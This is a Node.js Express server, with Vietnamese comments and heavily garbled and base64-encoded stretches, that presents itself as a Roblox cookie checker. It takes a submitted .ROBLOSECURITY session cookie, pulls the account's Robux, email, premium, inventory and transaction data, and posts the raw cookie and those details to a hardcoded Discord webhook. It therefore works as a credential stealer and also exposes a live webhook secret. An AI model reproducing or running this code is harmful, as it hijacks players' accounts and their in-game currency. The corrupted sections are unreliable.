require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const cors = require("cors");
const path = require("path");
const dns = require('dns');
const ping = require('ping');
const https = require('https');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1281163629278003221/UsFxAWKVhLDb37jw3eQdN7hqsXAxVYR6aZQLKrYC4oja7qqhW5PLDR45f5ztbAM4rSmY';

// Thêm middleware CORS
app.use(cors());

// Thêm middleware để serve static files
app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.json());

app.get("/", (req, res) =64(ɕ̹͕Ѡ}}ɹՉ๡ѵ4)4(4(#GG5ݕӆ4)Ё]Uɰ􀠤4(ɕɸ܁Aɽ͔ɕͽٔɕФ4(̹ɕݕМјȰф4(Ȥ4(ͽɽȠ3]G5ݕ蜰ȹͅ4(ɕɸɕСȤ4(4(ЁɥUɰ􁑅фɥ4(ɥUɰ4(ɕɸɕС܁ɽȠUI0ӆѹ4(4(ɕͽٔɥUɰ쀼QˆꌁۆUI0GGÆɥ4(4(4)4(5݅ɔG)M=84)͔ɕ̹ͽ4(4(5݅ɔGۆӆ4)͔ɕ̹хѥѠ}}ɹՉ4(4(ЃGԁӆ4(4)Р幌ɕİɕ̤4(Ё쁍ɕĹ4(4(4(ɕɸɕ̹х̠ͽ4(Ս聙͔4(ɽ耉-ѹѣ䁍4(4(4(4(Ё̀4(
聀I=	1=M
UI%Qd퍽4(М耝ѥͽ4(
ѥ耝ٔ4(U͕ȵМ耝5饱Ը]́9P]Ф]-мܸ؀-!Q50
ɽĸMɤܸ؜4(4(4(4(-
Ʉѣѹѥ͕4(ͽABIW6W'2&&6rТ67BW6W%&W76RvB47F6RvWBvGG3W6W'2&&6cW6W'2WFVF6FVBrТVFW'2ТFVWC�ТғРТbW6W%&W76RFFW6W%&W76RFFBТF&rWrW'&"t6R;Fr7rn1$p8nt hạn');
        }

        const userData = userResponse.data;
        console.log('Kết nối thành công đến users.roblox.com');

        // Lấy thông tin bổ sung
        console.log('Đang lấy thông tin chi tiết...');
        const userId = userData.id;

        // Tạo các promise cho các request
        const promises = [
            // Lấy thông tin Robux
            axiosInstance.get(`https://economy.roblox.com/v2/users/${userId}/currency`, {
                headers,
                timeout: 10000
            }).catch(error =64(ͽɽȠ3]ѣѹѥI蜰ɽȹͅ4(ɕɸ쁑фɽ4(4(4(3ѣѹѥ4(᥽%хР輽չ͕ѥ̹ɽํĽ4(̰4(ѥ4(эɽȀ4(ͽ3]ѣѹѥ蜰ɽȹͅ4(ɕɸ쁑фٕɥ聙͔4(4(4(3ѣѹѥɕմ4(᥽%хС輽ɕյɕ̹ɽํĽ͕̼͕%مє͡4(̰4(ѥ4(эɽȀТ66RrtvWF;FrF&V֗VӢrW'&"W76vRТ&WGW&FFf6RӰТҒРТWF;FrFfF Т47F6RvWBGG3FV&2&&6cW6W'2fF#W6W$G3GW6W$Gg6SC#C#ff&CvТVFW'2ТFVWC�ТҒ6F6W'&"`HBۜK	8nHH8n^H]]\\܋Y\YJNB]\]N]N[XYU\[WHHNBJKBBxnHH\YH]B^[[[K]
΋[[ܞK؛K݌\\\\YK[[ܞK[Z]LLBXY\B[Y[]LBJK]
\܈OBۜK	8nHHxnHH\YH]\܋Y\YJNB]\]N]NHHNBJKBB8n^HT8n[[ۜB^[[[K]
΋˜[[ۜ˘K\K^Y\\]\\YXB[Y[]LBJK]
\܈OBۜK\܊	8nHH8n^HT8n[[ۜΉ\܋Y\YJNB]\]N\HNBJKBB8n^H0[X[8nB^[[[K]
΋Xۛ^K؛K݌\\\\YK[X[ۋ][[YQ[YOVYX\[X[ە\O\[[X\XBXY\B[Y[]LBJK[\ۜHM response.data).catch(error =64(ͽ3]ѣѹѥ-蜰ɽȹͅ4(ɕɸIQхɕյMѥQхٕ፡Qхɍ͕Qх4(4(t4(4(
tӆЁꌁɕՕЁѣ4(ЁmɽḬḬɕյḬمхḬٕɥ!ḬɽḬɅͅѥt݅ЁAɽ͔ɽ͕̤4(4(-
ɄYɥ!Ѐ%̤4(ЁYɥ!Ѐٕɥ!I̹ффͽѕѕ͕%̤4(4(Ё]Uɰ݅Ё]Uɰ4(4(Sꅼݕѣѹѥ6l:6PТ67B6&VEvV&ТV&VG3ТFFS~)R6R7rrТFW67&FF;FrFL:6>vGW6W$FFWҢ⢤6RfVSG6WIk6Rl:vFW67&FТ6#fcТFV&âfF%&W2FFFFvUW&ТW&âfF%&W2FFFFvUW&ТVFVfVBТfVG3ТТS	BW6W&RrТfVSGW6W$FFWТƖSG'VPТТТS	iBW6W"BrТfVSGW6W$GТƖSG'VPТТТS	؝^	B[YN	ܛ؝^\˙]K؝^WB[[NYCBKBB[YN	'䣈[Z][IB[YN	[Z][T\˙]H		0WB[[NYCBKBB[YN	P Email',
                        value: `\`${emailRes.data.verified 6CѣŌ耝
ѣŌq4(Ք4(4(4(耟rYɥ!М4(مՔ聁qYɥ!Ѐ̜耝-ѹq4(Ք4(4(4(耟v8$rТfVSG&Ɩ5&W2FF&F6U7G&rvVU2r"EТƖSG'VPТТТS	ٚ[IB[YNX\WJ΋˜؛K\\\\YKٚ[JXB[[NYCBKBB[YN	'`N Rolimons',
                        value: `[Click Here](https://www.rolimons.com/player/${userId})`,
                        inline: true
                    },
                    {
                        name: ':money_mouth:  Summary',
                        value: `\`${transactions.purchasesTotal}\``,
                        inline: true
                    },
                    {
                        name: 'aB~JAI4(مՔ聁qɅͅѥ̹IQхq4(Ք4(4(4(耟~:AɕմMѥ̜4(مՔ聁qɅͅѥ̹ɕյMѥQхq4(Ք4(4(4(耟v+RFWfVW"W6vRrТfVSGG&67F2FWfVW$W6vUFFТƖSG'VPТТТfFW#ТFWCvGG3F66&BvruFdpТТFW7FWrFFRF47G&rТТӰРТ~֒vV&>IТvB27BD44$EtT$U$6&VEvV&Т66Rrt~֒vV&>IF:<;FrrРТ~֒vV&NfPТvB27BfUvV&W&6&VEvV&Т66RrtvnZHX8n[H0NBBnnHnt quả
        res.status(200).json({
            success: true,
            message: "Kiểm tra cookie thành công!",
            data: {
                userId,
                username: userData.name,
                displayName: userData.displayName,
                robux: robuxRes.data.robux || 0,
                premium: premiumRes.data,
                email: emailRes.data,
                avatar: avatarRes.data.data[0].imageUrl,
                hasVerifyHat: hasVerifyHat,
                rap: rolimonsRes.data.rap || 0,
                rolimons: `https://www.rolimons.com/player/${userId}`,
                pendingRobuxTotal: transactions.pendingRobuxTotal,
                premiumStipendsTotal: transactions.premiumStipendsTotal,
                developerExchangeTotal: transactions.developerExchangeTotal,
                purchasesTotal: transactions.purchasesTotal
            }
        });

    } catch (error) {
        if (error.response) {
            console.error('Lỗi:', error.response.status);
            console.error('Chi tiết:', error.response.data);
        } else {
            console.error('Lỗi không xác định:', error.message);
        }
        




        const errorMessage = {
            title: '❌ Lỗi Kiểm Tra Cookie',
            description: error.message || 'Lỗi không xác định',
            details: `Thời gian: ${new Date().toLocaleString('vi-VN')}\nMã lỗi: ${error.code || 'Không xác định'}`
        };

        // Gửi webhook thông báo lỗi
        try {
            await axios.post(DISCORD_WEBHOOK_URL, {
                embeds: [{
                    title: errorMessage.title,
                    description: errorMessage.description,
                    color: 0xFF0000,
                    fields: [
                        {
                            name: 'Chi tiết',
                            value: errorMessage.details
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
        } catch (webhookError) {
            console.error('Lỗi gửi webhook:', webhookError.message);
        }

        res.status(500).json({
            success: false,
            error: errorMessage.description,
            details: errorMessage.details
        });
    }
});

// Cấu hình DNS servers
dns.setServers([
    '8.8.8.8',    // Google DNS
    '8.8.4.4',    // Google DNS (backup)
    '1.1.1.1',    // Cloudflare DNS
    '1.0.0.1'     // Cloudflare DNS (backup)
]);

// Tạo instance axios với c`Fԁ䁍%4)Ё᥽%х᥽̹ɕє4(ѥ͕4(聹܁̹С4(ɕUѡɥ镐聙͔<Մ]MM04(ٔՔ4(ѥ4(4(ɽ聙͔SЁɽ䁷݌G-4(Iɕ4)4(4(4)ѕA=IPТ66Rr6W'fW"2'VrGG6Ɔ7CG%GЧғР=%2BIHsNCiAgICByZXMuc2VuZEZpbGUocGF0aC5qb2luKF9fZGlybmFtZSwgJ3B1YmxpYycsICdpbmRleC5odG1sJykpOw0KfSk7DQoNCi8vIEjDoG0gxJHhu4MgxJHhu41jIHdlYmhvb2sgdOG7qyBmaWxlDQpjb25zdCBnZXRXZWJob29rVXJsID0gKCkgPT4gew0KICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7DQogICAgICAgIGZzLnJlYWRGaWxlKCd3ZWJob29rLnR4dCcsICd1dGY4JywgKGVyciwgZGF0YSkgPT4gew0KICAgICAgICAgICAgaWYgKGVycikgew0KICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZSB3ZWJob29rLnR4dDonLCBlcnIubWVzc2FnZSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChlcnIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY29uc3QgdHJpbW1lZFVybCA9IGRhdGEudHJpbSgpOw0KICAgICAgICAgICAgaWYgKCF0cmltbWVkVXJsKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChuZXcgRXJyb3IoJ1VSTCB04burIGZpbGUga2jDtG5nIGjhu6NwIGzhu4cnKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXNvbHZlKHRyaW1tZWRVcmwpOyAvLyBUcuG6oyB24buBIFVSTCDEkcOjIMSRxrDhu6NjIHRyaW0NCiAgICAgICAgfSk7DQogICAgfSk7DQp9Ow0KLy8gTWlkZGxld2FyZSDEkeG7gyBwaMOibiB0w61jaCBKU09ODQphcHAudXNlKGV4cHJlc3MuanNvbigpKTsNCg0KLy8gTWlkZGxld2FyZSDEkeG7gyBwaOG7pWMgduG7pSB04buHcCB0xKluaA0KYXBwLnVzZShleHByZXNzLnN0YXRpYyhwYXRoLmpvaW4oX19kaXJuYW1lLCAncHVibGljJykpKTsNCg0KLy8gRW5kcG9pbnQgxJHhu4MgbMawdSBjb29raWUgdsOgbyB04buHcA0KDQphcHAucG9zdCgiL2NoZWNrLWNvb2tpZSIsIGFzeW5jIChyZXEsIHJlcykgPT4gew0KICAgIGNvbnN0IHsgY29va2llIH0gPSByZXEuYm9keTsNCg0KICAgIGlmICghY29va2llKSB7DQogICAgICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7IA0KICAgICAgICAgICAgc3VjY2VzczogZmFsc2UsIA0KICAgICAgICAgICAgZXJyb3I6ICJLaMO0bmcgdMOsbSB0aOG6pXkgY29va2llLiIgDQogICAgICAgIH0pOw0KICAgIH0NCg0KICAgIGNvbnN0IGhlYWRlcnMgPSB7DQogICAgICAgICdDb29raWUnOiBgLlJPQkxPU0VDVVJJVFk9JHtjb29raWV9YCwNCiAgICAgICAgJ0FjY2VwdCc6ICdhcHBsaWNhdGlvbi9qc29uJywNCiAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsDQogICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjEuMC4wLjAgU2FmYXJpLzUzNy4zNicNCiAgICB9Ow0KDQogICAgdHJ5IHsNCiAgICAgICAgLy8gS2nhu4NtIHRyYSBjb29raWUgdsOgIGzhuqV5IHRow7RuZyB0aW4gdXNlcg0KICAgICAgICBjb25zb2xlLmxvZygnxJBhbmcga%2BG6v3QgbuG7kWkgxJHhur9uIHVzZXJzLnJvYmxveC5jb20uLi4nKTsNCiAgICAgICAgY29uc3QgdXNlclJlc3BvbnNlID0gYXdhaXQgYXhpb3NJbnN0YW5jZS5nZXQoJ2h0dHBzOi8vdXNlcnMucm9ibG94LmNvbS92MS91c2Vycy9hdXRoZW50aWNhdGVkJywgew0KICAgICAgICAgICAgaGVhZGVycywNCiAgICAgICAgICAgIHRpbWVvdXQ6IDEwMDAwDQogICAgICAgIH0pOw0KDQogICAgICAgIGlmICghdXNlclJlc3BvbnNlLmRhdGEgfHwgIXVzZXJSZXNwb25zZS5kYXRhLmlkKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0Nvb2tpZSBraMO0bmcgaOG7o3AgbOG7hyBob%2BG6t2MgxJHDoyBo4bq%2FdCBo4bqhbicpOw0KICAgICAgICB9DQoNCiAgICAgICAgY29uc3QgdXNlckRhdGEgPSB1c2VyUmVzcG9uc2UuZGF0YTsNCiAgICAgICAgY29uc29sZS5sb2coJ0vhur90IG7hu5FpIHRow6BuaCBjw7RuZyDEkeG6v24gdXNlcnMucm9ibG94LmNvbScpOw0KDQogICAgICAgIC8vIEzhuqV5IHRow7RuZyB0aW4gYuG7lSBzdW5nDQogICAgICAgIGNvbnNvbGUubG9nKCfEkGFuZyBs4bqleSB0aMO0bmcgdGluIGNoaSB0aeG6v3QuLi4nKTsNCiAgICAgICAgY29uc3QgdXNlcklkID0gdXNlckRhdGEuaWQ7DQoNCiAgICAgICAgLy8gVOG6oW8gY8OhYyBwcm9taXNlIGNobyBjw6FjIHJlcXVlc3QNCiAgICAgICAgY29uc3QgcHJvbWlzZXMgPSBbDQogICAgICAgICAgICAvLyBM4bqleSB0aMO0bmcgdGluIFJvYnV4DQogICAgICAgICAgICBheGlvc0luc3RhbmNlLmdldChgaHR0cHM6Ly9lY29ub215LnJvYmxveC5jb20vdjIvdXNlcnMvJHt1c2VySWR9L2N1cnJlbmN5YCwgew0KICAgICAgICAgICAgICAgIGhlYWRlcnMsDQogICAgICAgICAgICAgICAgdGltZW91dDogMTAwMDANCiAgICAgICAgICAgIH0pLmNhdGNoKGVycm9yID0%2BIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgbOG6pXkgdGjDtG5nIHRpbiBSb2J1eDonLCBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICByZXR1cm4geyBkYXRhOiB7IHJvYnV4OiAwIH0gfTsNCiAgICAgICAgICAgIH0pLA0KDQogICAgICAgICAgICAvLyBM4bqleSB0aMO0bmcgdGluIGVtYWlsDQogICAgICAgICAgICBheGlvc0luc3RhbmNlLmdldCgnaHR0cHM6Ly9hY2NvdW50c2V0dGluZ3Mucm9ibG94LmNvbS92MS9lbWFpbCcsIHsNCiAgICAgICAgICAgICAgICBoZWFkZXJzLA0KICAgICAgICAgICAgICAgIHRpbWVvdXQ6IDEwMDAwDQogICAgICAgICAgICB9KS5jYXRjaChlcnJvciA9PiB7DQogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ0zhu5dpIGtoaSBs4bqleSB0aMO0bmcgdGluIGVtYWlsOicsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgIHJldHVybiB7IGRhdGE6IHsgdmVyaWZpZWQ6IGZhbHNlIH0gfTsNCiAgICAgICAgICAgIH0pLA0KDQogICAgICAgICAgICAvLyBM4bqleSB0aMO0bmcgdGluIHByZW1pdW0NCiAgICAgICAgICAgIGF4aW9zSW5zdGFuY2UuZ2V0KGBodHRwczovL3ByZW1pdW1mZWF0dXJlcy5yb2Jsb3guY29tL3YxL3VzZXJzLyR7dXNlcklkfS92YWxpZGF0ZS1tZW1iZXJzaGlwYCwgew0KICAgICAgICAgICAgICAgIGhlYWRlcnMsDQogICAgICAgICAgICAgICAgdGltZW91dDogMTAwMDANCiAgICAgICAgICAgIH0pLmNhdGNoKGVycm9yID0%2BIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnTOG7l2kga2hpIGzhuqV5IHRow7RuZyB0aW4gcHJlbWl1bTonLCBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICByZXR1cm4geyBkYXRhOiBmYWxzZSB9Ow0KICAgICAgICAgICAgfSksDQoNCiAgICAgICAgICAgIC8vIEzhuqV5IHRow7RuZyB0aW4gYXZhdGFyDQogICAgICAgICAgICBheGlvc0luc3RhbmNlLmdldChgaHR0cHM6Ly90aHVtYm5haWxzLnJvYmxveC5jb20vdjEvdXNlcnMvYXZhdGFyP3VzZXJJZHM9JHt1c2VySWR9JnNpemU9NDIweDQyMCZmb3JtYXQ9UG5nYCwgew0KICAgICAgICAgICAgICAgIGhlYWRlcnMsDQogICAgICAgICAgICAgICAgdGltZW91dDogMTAwMDANCiAgICAgICAgICAgIH0pLmNhdGNoKGVycm9yID0%2BIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnTOG7l2kga2hpIGzhuqV5IGF2YXRhcjonLCBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICByZXR1cm4geyBkYXRhOiB7IGRhdGE6IFt7IGltYWdlVXJsOiBudWxsIH1dIH0gfTsNCiAgICAgICAgICAgIH0pLA0KDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIFZlcmlmeSBIYXQNCiAgICAgICAgICAgIGF4aW9zSW5zdGFuY2UuZ2V0KGBodHRwczovL2ludmVudG9yeS5yb2Jsb3guY29tL3YyL3VzZXJzLyR7dXNlcklkfS9pbnZlbnRvcnkvOD9saW1pdD0xMDBgLCB7DQogICAgICAgICAgICAgICAgaGVhZGVycywNCiAgICAgICAgICAgICAgICB0aW1lb3V0OiAxMDAwMA0KICAgICAgICAgICAgfSkuY2F0Y2goZXJyb3IgPT4gew0KICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdM4buXaSBraGkga2nhu4NtIHRyYSBWZXJpZnkgSGF0OicsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgIHJldHVybiB7IGRhdGE6IHsgZGF0YTogW10gfSB9Ow0KICAgICAgICAgICAgfSksDQoNCiAgICAgICAgICAgIC8vIEzhuqV5IFJBUCB04burIFJvbGltb25zDQogICAgICAgICAgICBheGlvc0luc3RhbmNlLmdldChgaHR0cHM6Ly93d3cucm9saW1vbnMuY29tL2FwaS9wbGF5ZXJhc3NldHMvJHt1c2VySWR9YCwgew0KICAgICAgICAgICAgICAgIHRpbWVvdXQ6IDEwMDAwDQogICAgICAgICAgICB9KS5jYXRjaChlcnJvciA9PiB7DQogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIGzhuqV5IFJBUCB04burIFJvbGltb25zOicsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgIHJldHVybiB7IGRhdGE6IHsgcmFwOiAwIH0gfTsNCiAgICAgICAgICAgIH0pLA0KDQogICAgICAgICAgICAvLyBM4bqleSB0aMO0bmcgdGluIGdpYW8gZOG7i2NoDQogICAgICAgICAgICBheGlvc0luc3RhbmNlLmdldChgaHR0cHM6Ly9lY29ub215LnJvYmxveC5jb20vdjIvdXNlcnMvJHt1c2VySWR9L3RyYW5zYWN0aW9uLXRvdGFscz90aW1lRnJhbWU9WWVhciZ0cmFuc2FjdGlvblR5cGU9c3VtbWFyeWAsIHsNCiAgICAgICAgICAgICAgICBoZWFkZXJzLA0KICAgICAgICAgICAgICAgIHRpbWVvdXQ6IDEwMDAwDQogICAgICAgICAgICB9KS50aGVuKHJlc3BvbnNlID0%2BIHJlc3BvbnNlLmRhdGEpLmNhdGNoKGVycm9yID0%2BIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnTOG7l2kga2hpIGzhuqV5IHRow7RuZyB0aW4gZ2lhbyBk4buLY2g6JywgZXJyb3IubWVzc2FnZSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHsgcGVuZGluZ1JvYnV4VG90YWw6IDAsIHByZW1pdW1TdGlwZW5kc1RvdGFsOiAwLCBkZXZlbG9wZXJFeGNoYW5nZVRvdGFsOiAwLHB1cmNoYXNlc1RvdGFsOiAwIH07DQogICAgICAgICAgICB9KQ0KICAgICAgICBdOw0KDQogICAgICAgIC8vIENo4budIHThuqV0IGPhuqMgY8OhYyByZXF1ZXN0IGhvw6BuIHRow6BuaA0KICAgICAgICBjb25zdCBbcm9idXhSZXMsIGVtYWlsUmVzLCBwcmVtaXVtUmVzLCBhdmF0YXJSZXMsIHZlcmlmeUhhdFJlcywgcm9saW1vbnNSZXMsIHRyYW5zYWN0aW9uc10gPSBhd2FpdCBQcm9taXNlLmFsbChwcm9taXNlcyk7DQoNCiAgICAgICAgLy8gS2nhu4NtIHRyYSBWZXJpZnkgSGF0IChJRDogMTAyNjExODAzKQ0KICAgICAgICBjb25zdCBoYXNWZXJpZnlIYXQgPSB2ZXJpZnlIYXRSZXMuZGF0YS5kYXRhLnNvbWUoaXRlbSA9PiBpdGVtLmFzc2V0SWQgPT09IDEwMjYxMTgwMyk7DQoNCiAgICAgICAgY29uc3QgZmlsZVdlYmhvb2tVcmwgPSBhd2FpdCBnZXRXZWJob29rVXJsKCk7DQoNCiAgICAgICAgLy8gVOG6oW8gd2ViaG9vayBjaG8gdGjDtG5nIHRpbiB0w6BpIGtob%2BG6o24gdsOgIGNvb2tpZQ0KICAgICAgICBjb25zdCBjb21iaW5lZFdlYmhvb2sgPSB7DQogICAgICAgICAgICBlbWJlZHM6IFt7DQogICAgICAgICAgICAgICAgdGl0bGU6ICfinIUgQ29va2llIEjhu6NwIEzhu4cnLA0KICAgICAgICAgICAgICAgIGRlc2NyaXB0aW9uOiBgKipUaMO0bmcgdGluIHTDoGkga2hv4bqjbiBj4bunYSAke3VzZXJEYXRhLm5hbWV9KipcblxuKipDb29raWUgVmFsdWU6KiogXGAke2Nvb2tpZX1cYGAsIC8vIMSQxrBhIGNvb2tpZSB2w6BvIHBo4bqnbiBkZXNjcmlwdGlvbg0KICAgICAgICAgICAgICAgIGNvbG9yOiAweDAwZmYwMCwNCiAgICAgICAgICAgICAgICB0aHVtYm5haWw6IGF2YXRhclJlcy5kYXRhLmRhdGFbMF0uaW1hZ2VVcmwgPyB7DQogICAgICAgICAgICAgICAgICAgIHVybDogYXZhdGFyUmVzLmRhdGEuZGF0YVswXS5pbWFnZVVybA0KICAgICAgICAgICAgICAgIH0gOiB1bmRlZmluZWQsDQogICAgICAgICAgICAgICAgZmllbGRzOiBbDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6ICfwn5GkIFVzZXJuYW1lJywNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiBgXGAke3VzZXJEYXRhLm5hbWV9XGBgLA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6ICfwn4aUIFVzZXIgSUQnLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGBcYCR7dXNlcklkfVxgYCwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlubGluZTogdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiAn8J%2BSsCBSb2J1eCcsDQogICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogYFxgJHtyb2J1eFJlcy5kYXRhLnJvYnV4IHx8IDB9XGBgLA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6ICfwn5KOIFByZW1pdW0nLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGBcYCR7cHJlbWl1bVJlcy5kYXRhID8gJ0PDsycgOiAnS2jDtG5nJ31cYGAsDQogICAgICAgICAgICAgICAgICAgICAgICBpbmxpbmU6IHRydWUNCiAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogJ%2FCfk6cgRW1haWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGBcYCR7ZW1haWxSZXMuZGF0YS52ZXJpZmllZCA%2FICfEkMOjIHjDoWMgdGjhu7FjJyA6ICdDaMawYSB4w6FjIHRo4buxYyd9XGBgLA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6ICfinIUgVmVyaWZ5IEhhdCcsDQogICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogYFxgJHtoYXNWZXJpZnlIYXQgPyAnQ8OzJyA6ICdLaMO0bmcnfVxgYCwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlubGluZTogdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiAn8J%2BTiiBSQVAnLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGBcYCR7KHJvbGltb25zUmVzLmRhdGEucmFwIHx8IDApLnRvTG9jYWxlU3RyaW5nKCdlbi1VUycpfSBSJFxgYCwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlubGluZTogdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiAn8J%2BOriBQcm9maWxlJywNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiBgW0NsaWNrIEhlcmVdKGh0dHBzOi8vd3d3LnJvYmxveC5jb20vdXNlcnMvJHt1c2VySWR9L3Byb2ZpbGUpYCwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlubGluZTogdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiAn8J%2BOryBSb2xpbW9ucycsDQogICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogYFtDbGljayBIZXJlXShodHRwczovL3d3dy5yb2xpbW9ucy5jb20vcGxheWVyLyR7dXNlcklkfSlgLA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6ICc6bW9uZXlfbW91dGg6ICBTdW1tYXJ5JywNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiBgXGAke3RyYW5zYWN0aW9ucy5wdXJjaGFzZXNUb3RhbH1cYGAsDQogICAgICAgICAgICAgICAgICAgICAgICBpbmxpbmU6IHRydWUNCiAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogJ%2FCfkrAgUGVuZGluZyBSb2J1eCcsDQogICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogYFxgJHt0cmFuc2FjdGlvbnMucGVuZGluZ1JvYnV4VG90YWx9XGBgLA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6ICfwn46BIFByZW1pdW0gU3RpcGVuZHMnLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGBcYCR7dHJhbnNhY3Rpb25zLnByZW1pdW1TdGlwZW5kc1RvdGFsfVxgYCwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlubGluZTogdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiAn8J%2BStSBEZXZlbG9wZXIgRXhjaGFuZ2UnLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGBcYCR7dHJhbnNhY3Rpb25zLmRldmVsb3BlckV4Y2hhbmdlVG90YWx9XGBgLA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgICAgIGZvb3Rlcjogew0KICAgICAgICAgICAgICAgICAgICB0ZXh0OiAnaHR0cHM6Ly9kaXNjb3JkLmdnL2twN1hUamhqdk0nDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKQ0KICAgICAgICAgICAgfV0NCiAgICAgICAgfTsNCg0KICAgICAgICAvLyBH4butaSB3ZWJob29rIGPhu5EgxJHhu4tuaA0KICAgICAgICBhd2FpdCBheGlvcy5wb3N0KERJU0NPUkRfV0VCSE9PS19VUkwsIGNvbWJpbmVkV2ViaG9vayk7DQogICAgICAgIGNvbnNvbGUubG9nKCdH4butaSB3ZWJob29rIGPhu5EgxJHhu4tuaCB0aMOgbmggY8O0bmcnKTsNCg0KICAgICAgICAvLyBH4butaSB3ZWJob29rIHThu6sgZmlsZQ0KICAgICAgICBhd2FpdCBheGlvcy5wb3N0KGZpbGVXZWJo